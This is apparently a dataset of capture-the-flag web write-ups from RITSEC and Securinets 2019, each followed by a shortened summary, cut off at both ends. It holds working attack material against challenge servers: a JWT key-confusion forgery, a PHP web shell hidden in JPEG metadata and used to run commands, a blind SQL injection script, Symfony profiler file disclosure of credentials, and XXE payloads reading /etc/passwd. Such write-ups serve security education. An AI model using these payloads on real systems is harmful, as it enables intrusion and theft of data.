{""token"":""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJ1c2VyIiwiaWF0IjoxNTczODk3Nzc4fQ.gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ""}
```

You can decode the token to understand its format.

```
{""typ"":""JWT"",""alg"":""RS256""}
{""name"":""m3ssap0"",""type"":""user"",""iat"":1573897778}
gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ
```

As you can see, you have low privileges (i.e. `user`), but you can use this token to be authenticated.

```
GET http://ctfchallenges.ritsec.club:4000/api/normal HTTP/1.1
Accept-Encoding: gzip,deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJ1c2VyIiwiaWF0IjoxNTczODk3Nzc4fQ.gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ
Host: ctfchallenges.ritsec.club:4000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 09:52:38 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 79
Connection: keep-alive
X-Powered-By: Express
ETag: W/""4f-u9uH9/VkEWCKoW8TLnG/KetS8Ks""

{""flag"":""Congrats on authenticating! Too bad flags aren't for normal users !!""}
```

The authentication works, but the correct endpoint to call is `/admin`.

```
GET http://ctfchallenges.ritsec.club:4000/api/admin HTTP/1.1
Accept-Encoding: gzip,deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJ1c2VyIiwiaWF0IjoxNTczODk3Nzc4fQ.gZQldIgqszPZdD8eBxAsdCH6b8JJKp-Muem2sWX_8sFw8Wcqdt2GBhI6Uhu55RQx9Jv1EQykus7SRb9IIWiFHeVYuGGM5MZP2U3eTDOSscXZoMR6hVSOKHtDFsBVvvzob9-ZKjuOnziXCiOZHQPs2Bjfx-YThBhWZ8VyAMV2kUQ
Host: ctfchallenges.ritsec.club:4000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 10:04:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 26
Connection: keep-alive
X-Powered-By: Express
ETag: W/""1a-0ieoISNU3KaboLL5dBc9VysAH3I""

{""reason"":""Not an admin!""}
```

Unfortunately, you don't have enough privileges. Furthermore, trying to alter the JWT changing the `alg` to `none`, changing the `type` to `admin` and removing the signature will not work.

Analyzing the HTML source of the API documentation page, you can discover an interesting comment.

```
<!-- Robots can help you with the api -->
```

So you can discover: [http://ctfchallenges.ritsec.club:3000/robots.txt](http://ctfchallenges.ritsec.club:3000/robots.txt).

```
User-agent: * Disallow: /signing.pem Disallow: /auth
```

And you can get the signing certificate [signing.pem](signing.pem) that can be used to craft a malicious JWT.

```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBquzMGkZlJmZm4pYppxeDmsGd
8+9mOh5S9O7W7Gu5VByfl7i3JdCfGxRJdHscg6l321PeTXsXGZ7goHd4Xjv/FtKQ
DyoaKql4Kl692KKKN/9xA6tKdOYQbZvPqyRXUVOGdyZ12qFBOQzI7ox22YL3ul/3
nyiDR+p+JKbdVU6AWQIDAQAB
-----END PUBLIC KEY-----
```

The first part of the JWT is the following.

```
{""typ"":""JWT"",""alg"":""HS256""}
{""name"":""m3ssap0"",""type"":""admin"",""iat"":1573897778}

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0
```

The signature can be performed with following operations.

```
root@m3ss4p0:~# openssl x509 -in signing.pem -pubkey -noout > public_key.pem

root@m3ss4p0:~# cat signing.pem | xxd -p | tr -d ""\\n""
2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751444271757a4d476b5a6c4a6d5a6d34705970707865446d7347640a382b396d4f683553394f375737477535564279666c3769334a6443664778524a6448736367366c333231506554587358475a37676f486434586a762f46744b510a44796f614b716c344b6c3639324b4b4b4e2f39784136744b644f5951625a76507179525855564f4764795a31327146424f517a49376f783232594c33756c2f330a6e796944522b702b4a4b62645655364157514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a

root@m3ss4p0:~# echo -n ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0"" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751444271757a4d476b5a6c4a6d5a6d34705970707865446d7347640a382b396d4f683553394f375737477535564279666c3769334a6443664778524a6448736367366c333231506554587358475a37676f486434586a762f46744b510a44796f614b716c344b6c3639324b4b4b4e2f39784136744b644f5951625a76507179525855564f4764795a31327146424f517a49376f783232594c33756c2f330a6e796944522b702b4a4b62645655364157514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
(stdin)= 59d895e8e3aa3570f35f5894ab58349e5ed4510bbff976cb4c1315e2d41b6e81

root@m3ss4p0:~# python2 -c ""exec(\""import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('59d895e8e3aa3570f35f5894ab58349e5ed4510bbff976cb4c1315e2d41b6e81')).replace('=','')\"")""
WdiV6OOqNXDzX1iUq1g0nl7UUQu_-XbLTBMV4tQbboE
```

So the final JWT is the following.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0.WdiV6OOqNXDzX1iUq1g0nl7UUQu_-XbLTBMV4tQbboE
```

Now the right API endpoint can be called.

```
GET http://ctfchallenges.ritsec.club:4000/api/admin HTTP/1.1
Accept-Encoding: gzip,deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoibTNzc2FwMCIsInR5cGUiOiJhZG1pbiIsImlhdCI6MTU3Mzg5Nzc3OH0.WdiV6OOqNXDzX1iUq1g0nl7UUQu_-XbLTBMV4tQbboE
Host: ctfchallenges.ritsec.club:4000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 16 Nov 2019 11:01:12 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 36
Connection: keep-alive
X-Powered-By: Express
ETag: W/""24-vlpXTZ6UFXtGl+K+y0F+DaKpibw""

{""flag"":""RITSEC{JWT_th1s_0ne_d0wn}""}
```

The flag is the following.
```
RITSEC{JWT_th1s_0ne_d0wn}
```","Connecting to the website will give the following message: ""This page is only for authentication with our api, located at port 4000!""


Connecting to port 4000 will give some hint. 
At this point you have references to an exposed API. Trying to connect to '/normal' endpoint will result in an error 'JWS missing'.

So you can request with a HTTP GET a JWT using the `/auth` API and specifying a `name`.

You can decode the token to understand its format.

From it you can see that you have low privileges (i.e. `user`), but you can use this token to be authenticated performing a HTTP GET.

The authentication works, but the correct endpoint to call is `/admin`.

Unfortunately, you don't have enough privileges. Furthermore, trying to alter the JWT changing the `alg` to `none`, changing the `type` to `admin` and removing the signature will not work.

Analyzing the HTML source of the API documentation page, you can discover an interesting comment: 'Robots can help you with the api'.

So you can discover: /robots.txt

And you can get the signing certificate signing.pem that can be used to craft a malicious JWT.

Now the right API endpoint can be called to get the flag."
"# RITSEC CTF 2019 – Potat0

* **Category:** web
* **Points:** 158

## Challenge

> http://ctfchallenges.ritsec.club:8003/
>
> Flag format is RS_CTF{}
>
> Author: Pablo Potat0

## Solution

Connecting to the web site, an interesting HTML comment can be discovered.

```html
<article>
<link rel=""stylesheet"" type=""text/css"" href=""style.css"">
<a href=""https://facebook.com/groups/RITSEC.group/"" target=""_blank"">
  <svg version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" x=""0px"" y=""0px""
	 width=""30px"" height=""30px"" viewBox=""0 0 30 30"" enable-background=""new 0 0 30 30"" xml:space=""preserve"">
   <path id=""facebook"" fill=""#ffffff"" d=""M17.252,11.106V8.65c0-0.922,0.611-1.138,1.041-1.138h2.643V3.459l-3.639-0.015
	c-4.041,0-4.961,3.023-4.961,4.961v2.701H10v4.178h2.336v11.823h4.916V15.284h3.316l0.428-4.178H17.252z""/>
  </svg>
</a>

<a href=""https://instagram.com/_ritsec_"" target=""_blank"">
  <svg version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" x=""0px"" y=""0px""
	 width=""30px"" height=""30px"" viewBox=""0 0 30 30"" enable-background=""new 0 0 30 30"" xml:space=""preserve"">
   <path id=""instagram"" fill=""#ffffff"" d=""M22.107,3.415H7.893c-2.469,0-4.479,2.007-4.479,4.477v4.73v9.486c0,2.469,2.01,4.479,4.479,4.479h14.215
	c2.469,0,4.479-2.01,4.479-4.479v-9.486v-4.73C26.586,5.421,24.576,3.415,22.107,3.415 M23.393,6.086l0.512-0.004v0.511v3.416
	l-3.916,0.014l-0.012-3.928L23.393,6.086z M11.693,12.622c0.742-1.028,1.945-1.7,3.307-1.7s2.564,0.672,3.307,1.7
	c0.484,0.67,0.771,1.49,0.771,2.379c0,2.248-1.828,4.078-4.078,4.078c-2.248,0-4.078-1.83-4.078-4.078
	C10.922,14.112,11.211,13.292,11.693,12.622 M24.328,22.107c0,1.225-0.994,2.219-2.221,2.219H7.893
	c-1.225,0-2.219-0.994-2.219-2.219v-9.486h3.459C8.832,13.356,8.664,14.159,8.664,15c0,3.494,2.842,6.335,6.336,6.335
	s6.336-2.842,6.336-6.335c0-0.842-0.17-1.645-0.467-2.379h3.459V22.107z""/>
  </svg>
</a>
 
  
</a>
<!-- upload and photos not yet linked -->
</article>
```

So you can discover the existence of two more pages:
* [http://ctfchallenges.ritsec.club:8003/upload.php](http://ctfchallenges.ritsec.club:8003/upload.php)
* [http://ctfchallenges.ritsec.club:8003/photos.php](http://ctfchallenges.ritsec.club:8003/photos.php)

Basically the web application allows the upload of an image that will be displayed into a gallery. The upload functionality is vulnerable because it doesn't check the content of the image and it doesn't convert it in order to remove unwanted content.

As a consequence, a [shell](shell.php.jpeg) can be inserted into the image.

```
root@m3ss4p0:~# cp cat.jpeg shell.php.jpeg
root@m3ss4p0:~# exiftool -DocumentName=""<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?>"" shell.php.jpeg
    1 image files updated
```

The image is renamed, but it can be referenced to execute commands remotely.

```
http://ctfchallenges.ritsec.club:8003/uploads/10_0_0_37.php.jpeg?cmd=ls%20-al%20..

total 44
drwxr-xr-x 3 www-data www-data  4096 Nov 15 13:31 .
drwxr-xr-x 1 root     root      4096 Apr  3  2019 ..
-rw-r--r-- 1 www-data www-data 11321 Apr  3  2019 index.html
-rw-rw-r-- 1 root     root      1713 Nov 15 13:23 index.php
-rwxrwxr-x 1 root     root      2001 Nov 15 13:23 lib.php
-rwxrwxr-x 1 root     root      1871 Nov 15 13:23 photos.php
-rw-rw-r-- 1 root     root       809 Nov 15 13:23 style.css
-rwxrwxr-x 1 root     root      1331 Nov 15 13:23 upload.php
drwxr-xr-x 2 www-data www-data  4096 Nov 15 17:58 uploads



http://ctfchallenges.ritsec.club:8003/uploads/10_0_0_37.php.jpeg?cmd=find%20/%20-name%20flag*%202%3E%20/dev/null

/home/flag.txt
/tmp/npm-6-00351b95/registry.npmjs.org/flagged-respawn
/usr/local/lib/node_modules/gulp/node_modules/flagged-respawn
/usr/local/lib/node_modules/grunt-cli/node_modules/flagged-respawn
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags



http://ctfchallenges.ritsec.club:8003/uploads/10_0_0_37.php.jpeg?cmd=cat%20/home/flag.txt

RS_CTF{FILE_UPLOAD_ISN'T_SECURE}
```

The flag is the following.
```
RS_CTF{FILE_UPLOAD_ISN'T_SECURE}
```","Connecting to the web site, an interesting HTML comment can be discovered: 'upload and photos not yet linked'.

So you can discover the existence of two more pages.

Basically the web application allows the upload of an image that will be displayed into a gallery. The upload functionality is vulnerable because it doesn't check the content of the image and it doesn't convert it in order to remove unwanted content.

As a consequence, a shell.php.jpeg can be inserted into the image.

The image is renamed, but it can be referenced to execute commands remotely and get the flag."
"# Securinets Prequals CTF 2019 – Beginner's Luck

* **Category:** Web
* **Points:** 989

## Challenge

> Can you help me to win the flag ? I bet you can't ..
>
> https://web4.ctfsecurinets.com
>
> [files](files)
>
> Author:Tr'GFx

## Solution

The website simulates a guessing game where the target is to guess the random token (100 chars) generated for your IP address in order to read the flag.

The challenge gives you some files with the source code.

Analyzing the source code you can discover, into `play.php`, a query vulnerable to SQL injection:

```php
$sql = ""SELECT * FROM users WHERE ip='"" . $_SERVER['REMOTE_ADDR'] . ""' AND token='"" . $_POST['val'] . ""'"";
$result = $conn->query($sql);
```

It can be abused with a payload like the following.

```
POST /play.php HTTP/1.1
Host: web4.ctfsecurinets.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://web4.ctfsecurinets.com/play.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Cookie: PHPSESSID=xxxxxxxxxxxxxxxxxxxxxxxxxx
Upgrade-Insecure-Requests: 1

val=' OR ''='
```

Nothing is printed to output as result of the query, except for different messages when the query returns rows and when no rows are returned. 

These are the prerequisites for a *blind SQL injection*. Data could be exfiltrated, one char at a time, using `LIKE` statement.

The problem is that a limit for the number of the attempts is present (max 10 attempts). At the end of the attempts, the token will be reset. So it's impossible, *from the same IP where the token was generated*, to discover the token.

The solution is obvious: you have to generate the token from one IP, then you have to change the IP to discover the previous generated token.

The query to exfiltrate data is the following.

```sql
' OR (ip='x.x.x.x' AND token LIKE '{}%') #
```

*Please consider that the specified IP must be the one for which the token was generated, not the attacking one!*

A [Python script](beginners-luck.py) can be written to discover the token.

```python
import time
import random
import os
import string
import requests

token = """"
found = len(token)
letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
letter_candidate = 0
payload = ""val=' OR (ip='x.x.x.x' AND token LIKE '{}%') #""
headers = {
   ""User-Agent"": ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);"", 
   ""Content-Type"": ""application/x-www-form-urlencoded""
}
url_main = ""https://web4.ctfsecurinets.com/""
url_index = url_main + ""index.php""
url_play = url_main + ""play.php""
url_reset = url_main + ""reset.php""
url_start = url_main + ""start.php""

global_debug = False
def debug(page, local_debug):
   if global_debug and local_debug:
      print page.status_code
      print page.headers
      print page.text

try:

   print ""[*] Contacting '{}'."".format(url_reset)
   page = requests.get(url_reset, headers=headers)
   cookies = {""PHPSESSID"": page.cookies[""PHPSESSID""]}
   debug(page, False)
   

   while found < 100:

      print ""[*] Contacting '{}'."".format(url_index)
      page = requests.get(url_index, headers=headers, cookies=cookies)
      debug(page, False)

      if ""Session Expired"" in page.text:
         print ""[*] Session expired, contacting '{}'."".format(url_index)
         page = requests.get(url_index, headers=headers, cookies=cookies)
         debug(page, False)
      elif ""Attempt"" in page.text:
         letter = letters[letter_candidate]
         attempt = token + letter
         print ""[*] Attempt '{}'."".format(attempt)
         data = payload.format(attempt)
         print ""[*] Payload: {}."".format(data)
         page = requests.post(url_play, data=data, headers=headers, cookies=cookies)
         debug(page, False)
         
         if ""True"" in page.text:
            token += letter
            found += 1
            letter_candidate = 0
            print ""[*] Correct letter, new token '{}'."".format(token)
         elif ""Better luck next time"" in page.text:
            letter_candidate = letter_candidate + 1
            print ""[*] Wrong letter.""         
         elif ""Max Attempts Reahed"" in page.text:
            print ""[*] Max attempts reached, contacting '{}'."".format(url_index)
            page = requests.get(url_index, headers=headers, cookies=cookies)
            debug(page, False)
         else:
            print ""[!] Something not working.""
            break

      # Go to sleep.
      sleep_interval = 0
      print ""[*] Sleeping {} secs."".format(sleep_interval)
      time.sleep(sleep_interval)

except KeyboardInterrupt:
   print ""[-] Interrupted!""
```
*(Forgive me, but I wrote this script around 03:00 AM, so it's not the best I can do...)*

At the end the of the process, you can insert the token in the form at the following page. Be sure to use the IP for which the token was generated.

```
https://web4.ctfsecurinets.com/flag.php
```

The page will give you the flag.

```
Securinets{GG_uMadeIT_BLiIiND_M@N}
```","The website simulates a guessing game where the target is to guess the random token (100 chars) generated for your IP address in order to read the flag.

The challenge gives you some files with the source code.

Analyzing the source code you can discover, into `play.php`, a query vulnerable to SQL injection.

Nothing is printed to output as result of the query, except for different messages when the query returns rows and when no rows are returned. 

These are the prerequisites for a blind SQL injection. Data could be exfiltrated, one char at a time, using `LIKE` statement.

The problem is that a limit for the number of the attempts is present (max 10 attempts). At the end of the attempts, the token will be reset. So it's impossible, from the same IP where the token was generated, to discover the token.

The solution is obvious: you have to generate the token from one IP, then you have to change the IP to discover the previous generated token.

Please consider that the specified IP must be the one for which the token was generated, not the attacking one!

A Python script can be written to discover the token.

At the end the of the process, you can insert the token in the form at the following page. Be sure to use the IP for which the token was generated.

The page will give you the flag."
"# Securinets Prequals CTF 2019 – Custom Location

* **Category:** Web
* **Points:** 964

## Challenge

> Try to find out the database credentials.
> 
> The author changed the location of some files to protect the web application from script kiddies.
> 
> https://web0.ctfsecurinets.com/
>
> Author:TheEmperors

## Solution

Trying to reach pages (e.g. `https://web0.ctfsecurinets.com/foo.php`) will trigger Symfony error pages. From these pages it is possible to access to the Symfony profiler interface.

Analyzing one of the results (`https://web0.ctfsecurinets.com/_profiler/open?file=public/index.php&line=27#line27`)

```php
<?php
use App\Kernel;
use Symfony\Component\Debug\Debug;
use Symfony\Component\HttpFoundation\Request;
require dirname(__DIR__).'/config/bootstrap.php';
if ($_SERVER['APP_DEBUG']) {
    umask(0000);
    Debug::enable();
}
if ($trustedProxies = $_SERVER['TRUSTED_PROXIES'] ?? $_ENV['TRUSTED_PROXIES'] ?? false) {
    Request::setTrustedProxies(explode(',', $trustedProxies), Request::HEADER_X_FORWARDED_ALL ^ Request::HEADER_X_FORWARDED_HOST);
}
Request::setTrustedProxies(['127.0.0.1/8','::1', '172.17.0.0/16','192.0.0.1', '10.0.0.0/8'], Request::HEADER_X_FORWARDED_ALL);
if ($trustedHosts = $_SERVER['TRUSTED_HOSTS'] ?? $_ENV['TRUSTED_HOSTS'] ?? false) {
    Request::setTrustedHosts([$trustedHosts]);
}
$kernel = new Kernel($_SERVER['APP_ENV'], (bool) $_SERVER['APP_DEBUG']);
$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();
$kernel->terminate($request, $response);
```

an interesting file can be found: `require dirname(__DIR__).'/config/bootstrap.php';`.

Connecting to it (` https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php`), you can find the complete path to the environment file.

```php
<?php
use Symfony\Component\Dotenv\Dotenv;
require dirname(__DIR__).'/vendor/autoload.php';
// Load cached env vars if the .env.local.php file exists
// Run ""composer dump-env prod"" to create it (requires symfony/flex >=1.2)
if (is_array($env = @include dirname(__DIR__).'/.env.local.php')) {
    $_SERVER += $env;
    $_ENV += $env;
} elseif (!class_exists(Dotenv::class)) {
    throw new RuntimeException('Please run ""composer require symfony/dotenv"" to load the "".env"" files configuring the application.');
} else {
    // load all the .env files
    (new Dotenv())->loadEnv(dirname(__DIR__).'/secret_ctf_location/env');
}
$_SERVER['APP_ENV'] = $_ENV['APP_ENV'] = ($_SERVER['APP_ENV'] ?? $_ENV['APP_ENV'] ?? null) ?: 'dev';
$_SERVER['APP_DEBUG'] = $_SERVER['APP_DEBUG'] ?? $_ENV['APP_DEBUG'] ?? 'prod' !== $_SERVER['APP_ENV'];
$_SERVER['APP_DEBUG'] = $_ENV['APP_DEBUG'] = (int) $_SERVER['APP_DEBUG'] || filter_var($_SERVER['APP_DEBUG'], FILTER_VALIDATE_BOOLEAN) ? '1' : '0';
```

You can print the content of the environment file with `https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env`.

Into the environment file you can find the flag.

```
# In all environments, the following files are loaded if they exist,
# the later taking precedence over the former:
#
#  * .env                contains default values for the environment variables needed by the app
#  * .env.local          uncommitted file with local overrides
#  * .env.$APP_ENV       committed environment-specific defaults
#  * .env.$APP_ENV.local uncommitted environment-specific overrides
#
# Real environment variables win over .env files.
#
# DO NOT DEFINE PRODUCTION SECRETS IN THIS FILE NOR IN ANY OTHER COMMITTED FILES.
#
# Run ""composer dump-env prod"" to compile .env files for production use (requires symfony/flex >=1.2).
# https://symfony.com/doc/current/best_practices/configuration.html#infrastructure-related-configuration
###> symfony/framework-bundle ###
APP_ENV=dev
APP_SECRET=44705a2f4fc85d70df5403ac8c7649fd
#TRUSTED_PROXIES=127.0.0.1,127.0.0.2
#TRUSTED_HOSTS='^localhost|example\.com$'
###< symfony/framework-bundle ###
###> doctrine/doctrine-bundle ###
# Format described at http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/configuration.html#connecting-using-a-url
# For an SQLite database, use: ""sqlite:///%kernel.project_dir%/var/data.db""
# Configure your db driver and server_version in config/packages/doctrine.yaml
DATABASE_URL=mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task
###< doctrine/doctrine-bundle ###
###> symfony/swiftmailer-bundle ###
# For Gmail as a transport, use: ""gmail://username:password@localhost""
# For a generic SMTP server, use: ""smtp://localhost:25?encryption=&auth_mode=""
# Delivery is disabled by default via ""null://localhost""
MAILER_URL=null://localhost
###< symfony/swiftmailer-bundle ###
```

The flag is the following.

```
Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}
```","Trying to reach pages will trigger Symfony error pages. From these pages it is possible to access to the Symfony profiler interface.

Analyzing one of the results an interesting file can be found: `bootstrap.php`.

Connecting to it you can find the complete path to the environment file.

You can print the content of the environment file with `env`.

Into the environment file you can find the flag."
"# Securinets Prequals CTF 2019 – Feedback

* **Category:** Web
* **Points:** 731

## Challenge

> I created this website to get your feedback on our CTF.
>
> Can you check if it's secure ?
>
> https://web2.ctfsecurinets.com/
>
> Author:Tr'GFx

## Solution

The website contains a feedback form. Analyzing the source code, you will discover that feedback is sent via XML messages composed by JavaScript.

```javascript
<script type=""text/javascript"">
function func(){
    var xml = '' +
        '<?xml version=""1.0"" encoding=""UTF-8""?>' +
        '<feedback>' +
        '<author>' + $('input[name=""name""]').val() + '</author>' +
        '<email>' + $('input[name=""email""]').val() + '</email>' +
        '<content>' + $('input[name=""feedback""]').val() + '</content>' +
        '</feedback>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('Message').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open(""POST"",""feed.php"",true);
    xmlhttp.send(xml);
};
</script>
```

The server answers with a thanks message, inserting the author of the feedback in it.

The application is vulnerable to XXE and the `author` field can be used to return the output of the attack.

```
POST /feed.php HTTP/1.1
Host: web2.ctfsecurinets.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://web2.ctfsecurinets.com/
Content-Type: text/plain;charset=UTF-8
Content-Length: 206
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><feedback><author>&xxe;</author><email>lol</email><content>undefined</content></feedback>

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sat, 23 Mar 2019 18:49:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1114

<h4>Thanks For you Feedback root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
simple_user:x:1000:1000::/home/simple_user:/bin/bash
Debian-exim:x:102:102::/var/spool/exim4:/bin/false
</h4>
```

The remote code execution can't be performed.

So, you have to find the current working directory in order to find the flag file. You can abuse `/proc/self/` directory that contains the reference to current working directory: `cwd/`.

Hence the malicious payload is the following.

```
POST /feed.php HTTP/1.1
Host: web2.ctfsecurinets.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://web2.ctfsecurinets.com/
Content-Type: text/plain;charset=UTF-8
Content-Length: 214
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///proc/self/cwd/flag"" >]><feedback><author>&xxe;</author><email>lol</email><content>undefined</content></feedback>

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sat, 23 Mar 2019 21:27:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 67

